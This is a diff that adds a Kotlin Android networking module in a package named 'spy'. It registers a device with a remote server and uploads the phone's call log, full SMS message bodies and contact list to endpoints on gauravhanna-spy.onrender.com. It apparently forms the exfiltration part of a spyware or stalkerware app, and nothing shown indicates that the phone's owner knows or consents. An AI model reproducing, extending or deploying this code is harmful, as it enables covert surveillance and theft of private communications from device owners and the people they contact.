@@ -1,0 +1,153 @@
+package com.gauravhanna.spy
+
+import android.content.Context
+import android.content.SharedPreferences
+import android.util.Log
+import okhttp3.*
+import okhttp3.MediaType.Companion.toMediaType
+import org.json.JSONArray
+import org.json.JSONObject
+import java.io.IOException
+import java.util.concurrent.TimeUnit
+
+object NetworkHelper {
+    private const val TAG = "NetworkHelper"
+    private const val BASE_URL = "https://gauravhanna-spy.onrender.com/api/client"
+
+    private val client = OkHttpClient.Builder()
+        .connectTimeout(30, TimeUnit.SECONDS)
+        .writeTimeout(30, TimeUnit.SECONDS)
+        .readTimeout(30, TimeUnit.SECONDS)
+        .build()
+
+    private fun getDeviceId(context: Context): String? {
+        return context.getSharedPreferences("spy_prefs", Context.MODE_PRIVATE)
+            .getString("device_id", null)
+    }
+
+    private fun setDeviceId(context: Context, id: String) {
+        context.getSharedPreferences("spy_prefs", Context.MODE_PRIVATE)
+            .edit().putString("device_id", id).apply()
+    }
+
+    fun registerDevice(context: Context, deviceId: String, deviceName: String, model: String, androidVersion: String, userId: String) {
+        val json = JSONObject().apply {
+            put("deviceId", deviceId)
+            put("deviceName", deviceName)
+            put("deviceModel", model)
+            put("androidVersion", androidVersion)
+            put("userId", userId)
+        }
+        val request = Request.Builder()
+            .url("$BASE_URL/register")
+            .post(RequestBody.create("application/json".toMediaType(), json.toString()))
+            .build()
+        client.newCall(request).enqueue(object : Callback {
+            override fun onFailure(call: Call, e: IOException) {
+                Log.e(TAG, "Register failed: ${e.message}")
+            }
+            override fun onResponse(call: Call, response: Response) {
+                if (response.isSuccessful) {
+                    setDeviceId(context, deviceId)
+                    Log.d(TAG, "✅ Device registered")
+                } else {
+                    Log.e(TAG, "Register HTTP ${response.code}")
+                }
+                response.close()
+            }
+        })
+    }
+
+    fun sendCalls(context: Context, calls: List<DataCollector.CallLogEntry>) {
+        val deviceId = getDeviceId(context) ?: return
+        val arr = JSONArray()
+        for (c in calls) {
+            arr.put(JSONObject().apply {
+                put("phoneNumber", c.number)
+                put("contactName", c.name ?: "")
+                put("callType", c.type)
+                put("duration", c.duration)
+                put("timestamp", c.date)
+            })
+        }
+        val body = JSONObject().apply {
+            put("deviceId", deviceId)
+            put("calls", arr)
+        }
+        val request = Request.Builder()
+            .url("$BASE_URL/calls")
+            .post(RequestBody.create("application/json".toMediaType(), body.toString()))
+            .build()
+        client.newCall(request).enqueue(object : Callback {
+            override fun onFailure(call: Call, e: IOException) {
+                Log.e(TAG, "sendCalls failed: ${e.message}")
+            }
+            override fun onResponse(call: Call, response: Response) {
+                if (response.isSuccessful) Log.d(TAG, "✅ Calls sent")
+                else Log.e(TAG, "sendCalls HTTP ${response.code}")
+                response.close()
+            }
+        })
+    }
+
+    fun sendSMS(context: Context, smsList: List<DataCollector.SmsEntry>) {
+        val deviceId = getDeviceId(context) ?: return
+        val arr = JSONArray()
+        for (s in smsList) {
+            arr.put(JSONObject().apply {
+                put("app", "sms")
+                put("contactNumber", s.address)
+                put("message", s.body)
+                put("timestamp", s.date)
+                put("isIncoming", true)
+            })
+        }
+        val body = JSONObject().apply {
+            put("deviceId", deviceId)
+            put("messages", arr)
+        }
+        val request = Request.Builder()
+            .url("$BASE_URL/messages")
+            .post(RequestBody.create("application/json".toMediaType(), body.toString()))
+            .build()
+        client.newCall(request).enqueue(object : Callback {
+            override fun onFailure(call: Call, e: IOException) {
+                Log.e(TAG, "sendSMS failed: ${e.message}")
+            }
+            override fun onResponse(call: Call, response: Response) {
+                if (response.isSuccessful) Log.d(TAG, "✅ SMS sent")
+                else Log.e(TAG, "sendSMS HTTP ${response.code}")
+                response.close()
+            }
+        })
+    }
+
+    fun sendContacts(context: Context, contacts: List<DataCollector.ContactEntry>) {
+        val deviceId = getDeviceId(context) ?: return
+        val arr = JSONArray()
+        for (c in contacts) {
+            arr.put(JSONObject().apply {
+                put("name", c.name)
+                put("number", c.number)
+            })
+        }
+        val body = JSONObject().apply {
+            put("deviceId", deviceId)
+            put("contacts", arr)
+        }
+        val request = Request.Builder()
+            .url("$BASE_URL/contacts")
+            .post(RequestBody.create("application/json".toMediaType(), body.toString()))
+            .build()
+        client.newCall(request).enqueue(object : Callback {
+            override fun onFailure(call: Call, e: IOException) {
+                Log.e(TAG, "sendContacts failed: ${e.message}")
+            }
+            override fun onResponse(call: Call, response: Response) {
+                if (response.isSuccessful) Log.d(TAG, "✅ Contacts sent")
+                else Log.e(TAG, "sendContacts HTTP ${response.code}")
+                response.close()
+            }
+        })
+    }
+}
